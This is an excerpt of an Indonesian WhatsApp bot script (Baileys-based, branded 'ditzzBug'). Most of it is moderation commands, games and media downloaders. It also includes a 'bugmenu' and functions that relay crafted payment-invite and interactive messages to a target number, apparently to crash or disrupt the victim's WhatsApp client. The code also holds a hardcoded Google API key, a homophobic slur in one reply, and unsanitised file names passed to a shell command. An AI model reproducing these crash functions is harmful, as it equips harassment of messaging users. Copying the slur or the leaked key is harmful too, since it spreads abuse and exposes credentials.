...
DitzzXploit / ditzz
 ...
 | Created By DitzzXploit / ditzz
 | Rename By SisuryaOfficial
 | Base Ori By DitzzXploit / ditzz
...
//=================================================//
module.exports = ditzzBug = async (ditzzBug, m, chatUpdate, store) => {
try {
var body = (
...
//User
const botNumber = await ditzzBug.decodeJid(ditzzBug.user.id)
...
// Group
const groupMetadata = m.isGroup ? await ditzzBug.groupMetadata(m.chat).catch(e => {}) : ''
...
await ditzzBug.readMessages([readkey]);
}
ditzzBug.sendPresenceUpdate('available', m.chat)
if (db.data.settings[botNumber].autoTyping) {
if (m.message) {
ditzzBug.sendPresenceUpdate('composing', m.chat)
}
}
if (db.data.settings[botNumber].autoRecord) {
if (m.message) {
ditzzBug.sendPresenceUpdate('recording', m.chat)
}
}
...
await ditzzBug.updateProfileStatus(`✳️ RafatharBug - Client By : RafatharBug || ✅ Runtime : ${uptime}`)
...
if (m.message) {
ditzzBug.sendPresenceUpdate(jd, m.chat)
}
*/
//=================================================//
...
await ditzzBug.sendMessage(m.chat, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: m })
...
await ditzzBug.sendMessage(m.chat, { video: fs.readFileSync(mp4File), gifPlayback: false }, { quoted: m })
...
ditzzreply(`Kata kasar "${kata}" berhasil ditambahkan.`)
}
...
fs.writeFileSync('./src/badwords.json',JSON.stringify(badwords))
ditzzreply(`Kata kasar "${kata}" berhasil dihapus.`)
}
//=================================================//
//Status
if (!ditzzBug.public) {
...
let { key } = await ditzzBug.sendMessage(m.chat, {text: 'ʟᴏᴀᴅɪɴɢ...'})

for (let i = 0; i < gen2.length; i++) {
await sleep(10)
await ditzzBug.sendMessage(m.chat, {text: gen2[i], edit: key });
}
}
...
return ditzzBug.sendMessage(m.chat, {
contextInfo: {
...
if (!isBotAdmins) return ditzzreply(`${mess.botAdmin}, _Untuk menendang orang yang mengirim link group_`)
let gclink = (`https://chat.whatsapp.com/`+await ditzzBug.groupInviteCode(m.chat))
let isLinkThisGc = new RegExp(gclink, 'i')
let isgclink = isLinkThisGc.test(m.text)
if (isgclink) return ditzzBug.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAnda tidak akan ditendang oleh bot karena yang Anda kirim adalah link ke grup ini`})
if (isAdmins) return ditzzBug.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\nAdmin sudah mengirimkan link, admin bebas memposting link apapun`})
if (isDeveloper) return ditzzBug.sendMessage(m.chat, {text: `\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\Owner telah mengirim link, owner bebas memposting link apa pun`})
await ditzzBug.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
fromMe: false,
...
ditzzBug.sendMessage(m.chat, {text:`\`\`\`「 Group Link Terdeteksi 」\`\`\`\n\n@${m.sender.split("@")[0]} Jangan kirim group link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
}
 // Antiwame by geekz and modified by DitzzTheBug
if (AntiWame)
...
if (isAdmins) return ditzzreply(bvl)
if (mek.key.fromMe) return ditzzreply(bvl)
if (isDeveloper) return ditzzreply(bvl)
kice = m.sender
await ditzzBug.sendMessage(m.chat,
{
delete: {
...
/*ditzzBug.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ditzzBug.sendMessage(m.chat, {text:`\`\`\`「 Wa.me Link Terdeteksi 」\`\`\`\n\n@${kice.split("@")[0]} Jangan kirim wa.me link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
}
//antivirtex by geekz and modified by DitzzTheBug
  if (AntiVirtex) {
  if (budy.length > 3500) {
  if (!isBotAdmins) return ditzzreply(mess.botAdmin)
  await ditzzBug.sendMessage(m.chat,
{
delete: {
remoteJid: m.chat,
...
/*ditzzBug.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ditzzBug.sendMessage(m.chat, {text:`\`\`\`「 Kata Kasar Terdeteksi 」\`\`\`\n\n${pushname} Mohon tidak menggunakan kata kasar di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antiasing by geekz and modified by DitzzTheBug
...
await ditzzBug.groupParticipantsUpdate(m.chat, [member[i]], "remove")
await sleep(1000)
}
}
}
//antilink youtube video by geekz and modified by DitzzTheBug
...
/*ditzzBug.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ditzzBug.sendMessage(m.chat, {text:`\`\`\`「 YouTube Video Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim youtube video link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink youtube channel by geekz and modified by DitzzTheBug
...
/*ditzzBug.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ditzzBug.sendMessage(m.chat, {text:`\`\`\`「 YouTube Channel Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim youtube channel link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink instagram by geekz and modified by DitzzTheBug
...
/*ditzzBug.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ditzzBug.sendMessage(m.chat, {text:`\`\`\`「 Instagram Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim instagram link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink facebook by geekz and modified by DitzzTheBug
if (AntiLinkFacebook)
...
/*ditzzBug.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ditzzBug.sendMessage(m.chat, {text:`\`\`\`「 Facebook Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim facebook link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink telegram by geekz and modified by DitzzTheBug
if (AntiLinkTelegram)
...
/*ditzzBug.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ditzzBug.sendMessage(m.chat, {text:`\`\`\`「 Telegram Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim telegram link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink tiktok by geekz and modified by DitzzTheBug
if (AntiLinkTiktok)
...
/*ditzzBug.groupParticipantsUpdate(m.chat, [m.sender], 'remove')*/
ditzzBug.sendMessage(m.chat, {text:`\`\`\`「 Tiktok Link Terdeteksi 」\`\`\`\n\n${pushname} Jangan kirim tiktok link di group ini`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
} else {
}
//antilink twitter by geekz and modified by DitzzTheBug
if (AntiLinkTwitter)
...
//antilink all by geekz and modified by DitzzTheBug
if (AntiLinkAll)
...
await ditzzreply('*Anda Telah menyerah*')
delete tebakgambar[m.sender.split('@')[0]]
} else if (budy.toLowerCase() == jawaban) {
await ditzzBug.sendText(m.chat, `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉`, m)
delete tebakgambar[m.sender.split('@')[0]]
} else ditzzreply('*Jawaban Salah!*')
}
...
await ditzzreply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
delete kuismath[m.sender.split('@')[0]]
} else ditzzreply('*Jawaban Salah!*')
}
...
await ditzzBug.sendText(m.chat, `🎮 Asah Otak 🎮\n\nJawaban Benar 🎉`, m)
delete tebakasahotak[m.sender.split('@')[0]]
} else ditzzreply('*Jawaban Salah!*')
}
...
await ditzzBug.sendText(m.chat, `🎮 Siapakah Aku 🎮\n\nJawaban Benar 🎉`, m)
delete tebaksiapakahaku[m.sender.split('@')[0]]
} else ditzzreply('*Jawaban Salah!*')
}
...
await ditzzBug.sendText(m.chat, `🎮 Susun Kata 🎮\n\nJawaban Benar 🎉`, m)
delete tebaksusunkata[m.sender.split('@')[0]]
} else ditzzreply('*Jawaban Salah!*')
}
...
await ditzzBug.sendText(m.chat, `🎮 Tebak Bendera 🎮\n\nJawaban Benar 🎉`, m)
delete tebakbendera2[m.sender.split('@')[0]]
} else ditzzreply('*Jawaban Salah!*')
}
...
await ditzzBug.sendText(m.chat, `🎮 Tebak Kabupaten 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkabupaten[m.sender.split('@')[0]]
} else ditzzreply('*Jawaban Salah!*')
}
...
await ditzzBug.sendText(m.chat, `🎮 Tebak Kimia 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkimia[m.sender.split('@')[0]]
} else ditzzreply('*Jawaban Salah!*')
}
...
await ditzzBug.sendText(m.chat, `🎮 Teka Teki 🎮\n\nJawaban Benar 🎉`, m)
delete tebaktekateki[m.sender.split('@')[0]]
} else ditzzreply('*Jawaban Salah!*')
}
...
await ditzzBug.sendText(m.chat, `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉`, m)
delete tebaklagu[m.sender.split('@')[0]]
} else ditzzreply('*Jawaban Salah!*')
}
...
await ditzzBug.sendText(m.chat, `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkata[m.sender.split('@')[0]]
} else ditzzreply('*Jawaban Salah!*')
}
...
await ditzzBug.sendText(m.chat, `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉`, m)
delete tebakkalimat[m.sender.split('@')[0]]
} else ditzzreply('*Jawaban Salah!*')
}
...
await ditzzBug.sendText(m.chat, `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉`, m)
delete tebaklirik[m.sender.split('@')[0]]
} else ditzzreply('*Jawaban Salah!*')
}
...
await ditzzBug.sendText(m.chat, `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉`, m)
delete tebaktebakan[m.sender.split('@')[0]]
} else ditzzreply('*Jawaban Salah!*')
}
...
if (room.x !== room.o) ditzzBug.sendText(room.x, str, m, {
mentions: parseMention(str)
})
ditzzBug.sendText(room.o, str, m, {
mentions: parseMention(str)
})
if (isTie || isWin) {
...
ditzzreply(`Jangan tag, dia sedang afk\n\n*Reason :* ${getReason2}`)
}
}
...
ditzzBug.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} telah kembali dari afk`, m)
}
}
...
ditzzBug.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
...
ditzzBug.sendText(m.chat, `Suit telah dikirimkan ke chat
...
if (!roof.pilih) ditzzBug.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) ditzzBug.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) ditzzBug.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
ditzzBug.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
...
roof.text = m.text
ditzzreply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) ditzzBug.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
ditzzreply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) ditzzBug.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
...
ditzzBug.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}
...
await ditzzBug.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
//=================================================//
async function aipong(target) {
await ditzzBug.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
//=================================================//
 ...
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        ...
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg" } }, { upload: ditzzBug.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #ditzzBugdominate"
      },
      nativeFlowMessage: {
...
if (!isGroup && !isDeveloper && db.data.settings[botNumber].onlygrub ) {
	if (command){
return ditzzreply(` Halo ${m.pushName}! Karena Kami Ingin Mengurangi Spam, Silakan Gunakan Bot di Grup Chat !`)
}
}
...
// Status
case 'public': {
if (!isPremium) return ditzzreply(mess.premium) 
ditzzBug.public = true
ditzzreply('succes')
}
break
//=================================================//
...
┏══[ *❍SisuryaOfficial𓁹* ]═───⋆
│┏══════════════⋆</>
││ Creator : SisuryaOfficial
││ Library : WS-Baileys
││ Type : Case
││ Status : Ready
││ Script : Versi 2.0
││ Mode : ${ditzzBug.public ? '✱ Public ༣' : '✲ Self ༣'}
...
SisuryaOfficial © Copyright`

//Button Menu
ditzzBug.sendMessage(m.chat, {video: fs.readFileSync('./ditzzmenu.mp4'), gifPlayback: true, caption: penisbengkok, contextInfo: { externalAdReply: { title: `SisuryaOfficial Beta Botz`, body: `Creator SisuryaOfficial`, thumbnailUrl: 'https://telegra.ph/file/829c1d19b4e331aef80aa.jpg', sourceUrl: `https://telegra.ph/file/829c1d19b4e331aef80aa.jpg`, mediaType: 1, renderLargerThumbnail: true }}}, { quoted: qtoko })
}
break
//=================================================//
...
┗❐ 
`
ditzzBug.sendMessage(m.chat, {video: fs.readFileSync('./ditzzmenu.mp4'), gifPlayback: true, caption: itsmenu, contextInfo: { externalAdReply: { title: `SisuryaOfficial Beta Botz`, body: `Creator SisuryaOfficial`, thumbnailUrl: 'https://telegra.ph/file/829c1d19b4e331aef80aa.jpg', sourceUrl: `https://telegra.ph/file/829c1d19b4e331aef80aa.jpg`, mediaType: 1, renderLargerThumbnail: true }}}, { quoted: qtoko })
}
break
//=================================================//
case "bugmenu": {
...
│┗══════════════</>
│══[ *❍ SisuryaOfficial* ]═───⋆
╰˧ Copyright: 2024 SisuryaOfficial
 ┗══════════════</>
...
ditzzBug.sendMessage(m.chat, {video: fs.readFileSync('./ditzzmenu.mp4'), gifPlayback: true, caption: itsmenu, contextInfo: { externalAdReply: { title: `SisuryaOfficial Beta Botz`, body: `Creator SisuryaOfficial`, thumbnailUrl: '', sourceUrl: `https://telegra.ph/file/829c1d19b4e331aef80aa.jpg`, mediaType: 1, renderLargerThumbnail: true }}}, { quoted: qtoko })
}
break
//=================================================//
case 'botstatus': {
...
penis = fs.readFileSync("./ditzzBug.js").toString(),
...
//=================================================//
case 'sc': case 'script': {
ditzzreply(`🌤️Sc Ini Dibuat Oleh SisuryaOfficial.

❕Yt : ${global.yt}
❗Tl : t.me/SisuryaOfficial
...
let namaown = `SisuryaOfficial`
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `${namaown}`,
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${global.ownMain}:+${global.ownMain}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:[[ ༑SisuryaOfficial༑ ]]\nX-WA-BIZ-NAME: [[ ༑ SisuryaOfficial ༑ ]]\nEND:VCARD`,
}
}), { userJid: m.chat, quoted: m })
ditzzBug.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
break
//=================================================//
case 'assalamualaikum': {
ditzzBug.sendMessage(m.chat, { text: `waalaikumsalam`}, { quoted: m })
}
break
//=================================================//
/*case 'woi': case 'deck': case 'dick': case 'dek': case 'bocil': case 'esempe': case 'cil': case 'cill': case 'p': {
ditzzreply(`Harap yang sopan dalam memanggil orang, minimal mengatakan "Assalamu'alaikum warrahmatullahi Wabarakatuh" atau kalian bisa panggil Namanya. Tidak sopan itu, Jika *anda lebih tua* anda mengerti yang namanya etika.
...
ditzzBug.sendMessage(m.chat, { text: `kenapa?`}, { quoted: ryobug })
}
break
*/
case 'shutdown': {
if (!isDeveloper) return ditzzreply(mess.owner)
ditzzreply(`Otsukaresama deshita🖐`)
await sleep(5000)
process.exit()
}
break
...
ditzzreply(`Total case: ${totalCases}\n\n• ${totalCases > 0 ? listCases : "No cases found."}`);
}
break
//=================================================//
case "getname": {
...
var name = await ditzzBug.getName(q)
}
ditzzreply(name)
} else {
ditzzreply(m.pushName)
}
}
break
//=================================================//
...
if (Input) {
try {
var ppWong = await ditzzBug.profilePictureUrl(Input, "image")
} catch {
var ppWong = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
}
ditzzBug.sendMessage(m.chat, { image: { url: ppWong }}, { quoted: m })
} else {
try {
var ppWong = await ditzzBug.profilePictureUrl(m.sender, "image")
} catch {
var ppWong = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
}
ditzzBug.sendMessage(m.chat, { image: { url: ppWong }}, { quoted: m })
...
case 'changemenu':
if (!isDeveloper) return ditzzreply(mess.owner)
if (args.length < 1) return ditzzreply(`Example ${prefix + command} button/non`)
if (q == 'button') {
db.data.settings[botNumber].menuType = 'buttonImage'
ditzzreply(`Successfully Changed Menu To Button List Image`)
} else if (q == 'non') {
db.data.settings[botNumber].menuType = 'externalImage'
ditzzreply(`Successfully Changed Auto Typing To External Image`)
}
break
//=================================================//
case 'autorecord':
if (!isDeveloper) return ditzzreply(mess.owner)
if (args.length < 1) return ditzzreply(`Example ${prefix + command} on/off`)
if (q == 'on') {
db.data.settings[botNumber].autoRecord = true
ditzzreply(`Successfully Changed Auto Record To ${q}`)
} else if (q == 'off') {
...
ditzzreply(`Successfully Changed Auto Read To ${q}`)
} else if (q == 'off') {
...
ditzzreply(`Successfully Changed Auto Typing To ${q}`)
} else if (q == 'off') {
...
ditzzreply(`Successfully Changed Auto Bio To ${q}`)
} else if (q == 'off') {
...
ditzzreply(`Successfully Changed Onlygroup To ${q}`)
} else if (q == 'off') {
...
case 'join': {
if (!isDeveloper) return ditzzreply(mess.owner)
if (!text) return ditzzreply('Masukkan Link Group!')
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return 'Link Invalid!'
ditzzreply(mess.wait)
let result = args[0].split('https://chat.whatsapp.com/')[1]
await ditzzBug.groupAcceptInvite(result).then((res) => ditzzreply(jsonformat(res))).catch((err) => ditzzreply(jsonformat(err)))
}
break
//=================================================//
case 'self': {
if (!isDeveloper) return ditzzreply(mess.owner)
ditzzBug.public = false
ditzzreply('succes')
}
break
//=================================================//
...
if(users){
await ditzzBug.updateBlockStatus(users, "block")
ditzzreply(`Sukses block user`)
} else {
ditzzreply("Silakan reply pesan atau tag atau input nomer yang mau di block")
}
} else if(!isGroup){
if(q){
var woke = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(woke.startsWith("08")) return ditzzreply("Awali nomer dengan 62")
if(!woke.startsWith("62")) return ditzzreply("Silakan reply pesan atau tag atau input nomer yang mau di block")
await ditzzBug.updateBlockStatus(woke, "block")
} else if(!q){
ditzzreply("Masukan nomer yang ingin di block")
}
ditzzreply(`Berhasil Block user ${woke.split("@")[0]}`)
}
break
//=================================================//
case 'unblock':
...
if(isGroup){
if(users){
await ditzzBug.updateBlockStatus(users, "unblock")
await ditzzreply(`Sukses unblock user`)
} else if(!q){
ditzzreply("Silakan reply pesan atau tag atau input nomer yang mau di block")
}
} else if(!isGroup){
...
if(woke.startsWith("08")) return ditzzreply("Awali nomer dengan 62")
if(!woke.startsWith("62")) return ditzzreply("Silakan reply pesan atau tag atau input nomer yang mau di block")
await ditzzBug.updateBlockStatus(woke, "unblock")
ditzzreply(`Sukses unblock ${woke}`)
} else if(!q){
ditzzreply("Masukan nomer yang ingin di unblock")
}
...
//=================================================//
case 'listblock':{
let block = await ditzzBug.fetchBlocklist()
ditzzreply('List Block :\n\n' + `Total : ${block == undefined ? '*0* Diblokir' : '*' + block.length + '* Diblokir'}\n` + block.map(v => '• ' + v.replace(/@.+/, '')).join`\n`)
}
break
//=================================================//
case 'setppbot':{
if (!isDeveloper) return ditzzreply(mess.owner);
if(m.quoted){
const media = await ditzzBug.downloadAndSaveMediaMessage(quoted)
const { img } = await generateProfilePicture(media)
await ditzzBug.query({ tag: 'iq',  attrs: { to: botNumber, type:'set', xmlns: 'w:profile:picture'}, content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]})   
await ditzzreply(`${mess.success}`)
} else ditzzreply("Reply fotonya")
}
break
//=================================================//
case 'delppbot': {
if (!isDeveloper) return ditzzreply(mess.owner);
ditzzBug.removeProfilePicture(ditzzBug.user.id)
ditzzreply(mess.succes)
}
break
//=================================================//
case 'setbiobot':{
if (!isDeveloper) return ditzzreply(mess.owner);
if (!q) return ditzzreply(`Kirim perintah ${prefix+command} nama\n\nContoh : ${command} Paijo`)
await ditzzBug.updateProfileStatus(q)
await ditzzreply(`Berhasil mengganti status bio ke *${q}*`)
}
break
//=================================================//
case 'listpc': {
...
case "addcase": {
if (!isDeveloper) return ditzzreply(mess.owner);
if (!q) return ditzzreply(`Masukan Input`);
if (!q.includes("|")) return ditzzreply("Format perintah tidak valid. Gunakan: addcase <tempat>|case \"casenya\">{ ... } break")

let tempat = q.split("|")[0];
let casenya = q.split("|")[1];
let newCase = casenya

let fileContent = fs.readFileSync("./ditzzBug.js", "utf-8");
...
fs.writeFileSync("./ditzzBug.js", fileContent, "utf-8");

ditzzreply(`Case baru "${casenya}" berhasil ditambahkan di bawah case "${tempat}"!`);
} else {
ditzzreply(`Tidak dapat menemukan break di case "${tempat}".`);
}
}
break
//=================================================//
case "delcase": {
if (!isDeveloper) return ditzzreply(mess.owner);
if (!q) return ditzzreply("Masukkan nama case yang ingin dihapus, contoh: delcase gpt4");
...
ditzzreply(`Case "${caseName}" berhasil dihapus!`);
} else {
ditzzreply(`Tidak dapat menemukan case "${caseName}" untuk dihapus.`);
}
}
break
//=================================================//
case 'iniryo' : {
ditzzBug.sendMessage(m.chat, { text: `_ryo itu ganteng banget, aku jdi suka ama dia 😣😖😫_` }, { quoted: m })
}
break
//=================================================//
case 'terkentod' : {
ditzzBug.sendMessage(m.chat, { text: `Hoekkkkkkk🤮🤮🤮. najis ada gay, mati aja lu kontol🤢` }, { quoted: m })
}
break
//=================================================//
case "emojimix": {
let [emoji1, emoji2] = text.split`+`
if (!emoji1) return ditzzreply(`*Example: ${prefix+command} 😅 + 🤔*`)
if (!emoji2) return ditzzreply(`*Example: ${prefix+command} 😅 + 🤔*`)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await ditzzBug.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
...
//=================================================//
case "emojimix2": {
if (!text) return ditzzreply(`*Example: ${prefix+command} 😅*`)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await ditzzBug.sendImageAsSticker(m.chat, res.url, m, { packname: pushname, author: author, categories: res.tags })
await fs.unlinkSync(encmedia);
}
}
break
...
if (!text) return ditzzreply('Enter Query text!')
...
case 'stiker':
case 's':{
if (!quoted) return ditzzreply(`Balas Video/Image Dengan Caption ${prefix + command}`)
ditzzreply(mess.wait)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await ditzzBug.sendImageAsSticker(m.chat, media, m, {
packname: global.packname,
author: global.author
})
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return ditzzreply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await ditzzBug.sendVideoAsSticker(m.chat, media, m, {
packname: global.packname,
author: global.author
})
} else {
return ditzzreply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
break
//=================================================//
case 'smeme': {
 if (!text) return ditzzreply(`Balas Image Dengan Caption ${prefix + command}`)
if (!quoted) return ditzzreply(`Balas Image Dengan Caption ${prefix + command}`)
if (/image/.test(mime)) {
ditzzreply(mess.wait)
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
let dwnld = await ditzzBug.downloadAndSaveMediaMessage(qmsg)
...
let pop = await ditzzBug.sendImageAsSticker(m.chat, smeme, m, {
packname: global.packname,
author: global.author
})
fs.unlinkSync(pop)
...
case 'toimage':
case 'toimg': {
if (!/webp/.test(mime)) return ditzzreply(`Reply sticker dengan caption *${prefix + command}*`)
ditzzreply(mess.wait)
let media = await ditzzBug.downloadAndSaveMediaMessage(qmsg)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) return err
let buffer = fs.readFileSync(ran)
ditzzBug.sendMessage(m.chat, {
image: buffer
}, {
quoted: m
})
...
case 'tomp4':
case 'tovideo': {
if (!/webp/.test(mime)) ditzzreply(`ditzzreply stiker dengan caption *${prefix + command}*`)
ditzzreply(mess.wait)
var media = await ditzzBug.downloadAndSaveMediaMessage(quoted, new Date * 1)
let webpToMp4 = await webp2mp4File(media)
ditzzBug.sendMessage(m.chat, { video: {url: webpToMp4.result}, caption: 'Convert Sticker To Video'}, { quoted: m })
...
case 'toaud':
case 'toaudio': {
if (!/video/.test(mime) && !/audio/.test(mime)) return ditzzreply(`Kirim/ditzzreply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)
ditzzreply(mess.wait)
let media = await ditzzBug.downloadMediaMessage(qmsg)
...
//=================================================//
case 'attp':{
 if (!text) return ditzzreply(`❗Gagitu Bego, Nih Gw Ajarin\n${prefix + command} RyoCakep`)
let lubangtile = `https://aemt.me/attp?text=${q}`
await ditzzBug.sendVideoAsSticker(m.chat, lubangtile, m, {
packname: global.packname,
author: global.author
})
}
...
if (!text) return ditzzreply(`*Example: ${prefix+command} https://instagram.com/ditzzBug*`)
...
if (!quoted) return ditzzreply(`Fotonya Mana?`)
if (!/image/.test(mime)) return ditzzreply(`Send/Reply Foto Dengan Caption ${prefix + command}`)
ditzzreply(mess.wait)
let media = await quoted.download()
let proses = await remini(media, "enhance");
ditzzBug.sendMessage(m.chat, { image: proses, caption: '_Maaf Kak, Kalau Hasilnya Nggak Bagus_ T_T'}, { quoted: m })
}
break
//=================================================//
case 'git': case 'gitclone': {
if (!args[0]) return ditzzreply(`Mana link nya?\nContoh :\n${prefix ? prefix : '.'}${command} https://github.com/YukiShima4/tes`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return ditzzreply(`Link invalid!!`)
await ditzzreply(mess.wait)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
let [, user, repo] = args[0].match(regex1) || []
repo = repo.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repo}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
ditzzBug.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => ditzzreply(err))
}   
break
//=================================================//
case 'mediafire': {
if (!text) return ditzzreply(`Gunakan dengan cara ${prefix + command} *url*`)
ditzzreply(mess.wait)
let anu = await fetchJson(`https://aemt.me/mediafire?link=${q}`)
let hasdl = anu.result.link
let namafile = anu.result.title
ditzzBug.sendMessage(m.chat, { document: { url: hasdl }, fileName: namafile, mimetype: '*/*' }, { quoted: m })
}
break
//=================================================//
case 'igdlmp4': {
...
//=================================================//
case 'happymod':{
if (!q) return ditzzreply(`Example ${prefix+command} Sufway surfer mod`)
ditzzreply (mess.wait)
let kat = await scp1.happymod(q)
ditzzreply (util.format(kat))
}
break
//=================================================//
case 'play': 
...
case 'playmusik':
case 'playmusic': {
if (!q) return ditzzreply("Kirim perintah judul lagu/link youtube nya bwang")
try {
let rus = await yts(q)
if (rus.all.length == "0") return ditzzreply("Video tidak bisa di download")
...
ditzzBug.sendMessage(m.chat, { contextInfo: { externalAdReply: { showAdAttribution: false, 
title: `${res.title}`,
body: `${week} ${calender}`,
mediaType: 2,  
...
console.log(err)
ditzzreply(`Server sedang error`)
}
}
break
//=================================================//
...
case 'youtubemp3':
case 'youtubeaudio':{
if(!q) return ditzzreply(`Contoh : ${prefix+command} Link`)
await ditzzreply(mess.wait)
downloadMp3(text)
}
break
...
case 'tiktok':
case 'tiktokvideo': {
if (!text) return ditzzreply( `Contoh : ${prefix + command} link`)
if (!q.includes('tiktok')) return ditzzreply(`Link Invalid!!`)
await ditzzreply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
ditzzBug.sendMessage(m.chat, { video: { url: data.nowm }}, { quoted: m })
})
}
break
//=================================================//
case 'tiktokmp3':
case 'tiktokaudio': {
if (!text) return ditzzreply( `Example : ${prefix + command} link`)
if (!q.includes('tiktok')) return ditzzreply(`Link Invalid!!`)
await ditzzreply(mess.wait)
require('./lib/tiktok').Tiktok(q).then( data => {
ditzzBug.sendMessage(m.chat, { audio: { url: data.audio }, mimetype: 'audio/mp4' }, { quoted: m })
})
}
break
